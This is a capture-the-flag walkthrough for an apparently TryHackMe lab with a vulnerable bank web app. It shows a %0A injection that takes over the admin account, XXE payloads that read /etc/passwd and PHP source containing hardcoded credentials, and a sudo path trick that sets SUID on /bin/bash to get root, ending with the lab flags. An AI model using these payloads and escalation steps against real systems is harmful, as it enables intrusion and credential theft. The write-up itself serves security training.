# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

![Pasted image 20250425124706.png](../../IMAGES/Pasted%20image%2020250425124706.png)

Let's fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.115.174/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.115.174/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

 [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 160ms]
scripts [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 160ms]
report [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 160ms]
```


We got `scripts` and `report`, `report` is a binary, if we check the strings, we can see this:

```
strings report
/lib64/ld-linux-x86-64.so.2
__isoc99_scanf
puts
printf
system
__cxa_finalize
strcmp
__libc_start_main
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
admin@bank.a
Password Updated Successfully!
Sorry you can't update the password
Welcome Guest
===================Available Options==============
1. Check users
2. Add user
3. Delete user
4. change password
5. Exit
clear
===============List of active users================
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
control_admin@bank.a
it_admin@bank.a
Welcome To ABC DEF Bank Managemet System!
UserName :
Password :
guest
Your Choice :
email :
not available for guest account
Wrong option
Wrong username or password
;*3$"
GCC: (Debian 9.3.0-15) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7452
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
report.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
update
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
options
system@@GLIBC_2.2.5
users
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Seems weird, let's use `ghidra`:

![Pasted image 20250425125111.png](../../IMAGES/Pasted%20image%2020250425125111.png)

We got some active users, let's check other functions:

![Pasted image 20250425125133.png](../../IMAGES/Pasted%20image%2020250425125133.png)

![Pasted image 20250425125224.png](../../IMAGES/Pasted%20image%2020250425125224.png)


![Pasted image 20250425125242.png](../../IMAGES/Pasted%20image%2020250425125242.png)


We got hardcoded guest credentials, we can use these to interact with the binary:

```
guest:guest
```

Let's begin exploitation.



# EXPLOITATION
---

Let's interact with the binary:

![Pasted image 20250425125457.png](../../IMAGES/Pasted%20image%2020250425125457.png)

We can check users:

```
===============List of active users================
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
admin@bank.a
control_admin@bank.a
it_admin@bank.a
```

Since we can add users, there must be other stuff, let's fuzz again:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.115.174/FUZZ" -ic -c -t 200 -e .php,.html,.git

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.115.174/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .git
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php [Status: 403, Size: 284, Words: 21, Lines: 11, Duration: 161ms]
register.php [Status: 200, Size: 715, Words: 49, Lines: 28, Duration: 163ms]
index.html [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 1106ms]
.html [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 6138ms]
admin.php [Status: 200, Size: 663, Words: 45, Lines: 26, Duration: 210ms]
scripts [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 187ms]
forms.php [Status: 200, Size: 2334, Words: 460, Lines: 112, Duration: 258ms]
report [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 159ms]
logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 245ms]
dashboard.php [Status: 302, Size: 908, Words: 87, Lines: 56, Duration: 164ms]
```

Let's go to `register.php`:

![Pasted image 20250425125731.png](../../IMAGES/Pasted%20image%2020250425125731.png)

Let's submit the request to our proxy to handle it better:


![Pasted image 20250425130038.png](../../IMAGES/Pasted%20image%2020250425130038.png)

As we can notice, it does not allow us to register with `admin@bank.a`, but, if we recall the strings correctly, this is using `system()`, which mean that if we are able to do it correctly, our commands may be interpreted and we can inject stuff like `%0A` or `%09`, let's try it out:


![Pasted image 20250425130239.png](../../IMAGES/Pasted%20image%2020250425130239.png)

There we go `%0A` seems to do the trick, let's go inside the admin panel:

![Pasted image 20250425130320.png](../../IMAGES/Pasted%20image%2020250425130320.png)


The `command` one seems odd, let's check it out:

![Pasted image 20250425130350.png](../../IMAGES/Pasted%20image%2020250425130350.png)

Once again, let's submit to our proxy:

![Pasted image 20250425130433.png](../../IMAGES/Pasted%20image%2020250425130433.png)

The format of it may suggest it is vulnerable to `XXE`, let's try some stuff then, for example, a basic `LFI`:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
 <name>
&xxe;</name>
<search>&xxe;
</search>
</root>
```

![Pasted image 20250425131018.png](../../IMAGES/Pasted%20image%2020250425131018.png)

We got LFI, `expect` wrapper is not enabled so we cannot get `RCE`, but, we can read other system file, for example, if we click on `My Account`, we get a `GET` request to `acc.php`, we can maybe get more info if we read this file, we need to use `php://filter`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
]>
<root>
 <name>
&xxe;</name>
<search>&xxe;
</search>
</root>
```

![Pasted image 20250425131503.png](../../IMAGES/Pasted%20image%2020250425131503.png)

Let's decode these contents:

```html
<!DOCTYPE html>
<html>
<head>
<style>
form
{
 border: 2px solid black;
 outline: #4CAF50 solid 3px;
 margin: auto;
 width:180px;
 padding: 20px;
 text-align: center;
}


ul {
 list-style-type: none;
 margin: 0;
 padding: 0;
 overflow: hidden;
 background-color: #333;
}

li {
 float: left;
 border-right:1px solid #bbb;
}

li:last-child {
 border-right: none;
}

li a {
 display: block;
 color: white;
 text-align: center;
 padding: 14px 16px;
 text-decoration: none;
}

li a:hover:not(.active) {
 background-color: #111;
}

.active {
 background-color: blue;
}
</style>
</head>
<body>

<ul>
 <li><a href="dashboard.php">Dashboard</a></li>
 <li><a href="with.php">Withdraw Money</a></li>
 <li><a href="depo.php">Deposit Money</a></li>
 <li><a href="tra.php">Transfer Money</a></li>
 <li><a href="acc.php">My Account</a></li>
 <li><a href="forms.php">command</a></li>
 <li><a href="logout.php">Logout</a></li>
 <li style="float:right"><a href="contact.php">Contact Us</a></li>
</ul><br><br><br><br>

</body>
</html>

<?php

session_start();
if(isset($_SESSION['favcolor']) and $_SESSION['favcolor']==="admin@bank.a")
{

echo "<h3 style='text-align:center;'>Weclome to Account control panel</h3>";
echo "<form method='POST'>";
echo "<input type='text' placeholder='Account number' name='acno'>";
echo "<br><br><br>";
echo "<input type='text' placeholder='Message' name='msg'>";
echo "<input type='submit' value='Send' name='btn'>";
echo "</form>";
//MY CREDS :- cyber:super#secure&password!
if(isset($_POST['btn']))
{
$ms=$_POST['msg'];
echo "ms:".$ms;
if($ms==="id")
{
system($ms);
}
else if($ms==="whoami")
{
system($ms);
}
else
{
echo "<script>alert('RCE Detected!')</script>";
session_destroy();
unset($_SESSION['favcolor']);
header("Refresh: 0.1; url=index.html");
}
}
}
else
{
echo "<script>alert('Only Admins can access this page!')</script>";
session_destroy();
unset($_SESSION['favcolor']);
header("Refresh: 0.1; url=index.html");
}
?>

```


We got some credentials:

```
cyber:super#secure&password!
```

![Pasted image 20250425131719.png](../../IMAGES/Pasted%20image%2020250425131719.png)


Let's begin PrivEsc.


# PRIVILEGE ESCALATION
---

```
cyber@ubuntu:~$ cat flag1.txt
THM{6f7e4dd134e19af144c88e4fe46c67ea}
```

If we check our privileges, we can notice this:

```
cyber@ubuntu:~$ sudo -l
Matching Defaults entries for cyber on ubuntu:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
 (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
```

Let's check that file then:

```
cyber@ubuntu:~$ ls -la run.py
-rwx------ 1 root root 349 Nov 15 2020 run.py
cyber@ubuntu:~$ cat run.py
cat: run.py: Permission denied
```

Only `root` can visualize or edit the file, the vulnerability on here lays on the path, since the script is inside of `cyber`, we can modify the file into another extension and create a malicious `run.py` file:

```bash
mv run.py run.py.php
```

Now, let's create a malicious python file:

```python
import os
os.system('chmod u+s /bin/bash')
```

Now, we can run the script as sudo:

```bash
sudo /usr/bin/python3 /home/cyber/run.py
```

If we check `/bin/bash`:

![Pasted image 20250425132224.png](../../IMAGES/Pasted%20image%2020250425132224.png)

There we go, we can simply do:

```bash
/bin/bash -p
```

![Pasted image 20250425132249.png](../../IMAGES/Pasted%20image%2020250425132249.png)

We can find all flags now, there are three flags on this CTF:

```
bash-4.3# find / -type f -name "*.txt" 2>/dev/null | head -n 3 
/home/cyber/flag1.txt
/home/yash/flag2.txt
/root/root.txt
```

```
bash-4.3# cat /home/yash/flag2.txt
THM{20c1d18791a246001f5df7867d4e6bf5}
```

```
bash-4.3# cat /root/root.txt
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
â–ˆâ–ˆ â–ˆâ–ˆ
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ


						battery designed by cyberbot :)
						Please give your reviews on catch_me75@protonmail.com or discord cyberbot#1859



THM{db12b4451d5e70e2a177880ecfe3428d}
```


![Pasted image 20250425133033.png](../../IMAGES/Pasted%20image%2020250425133033.png)

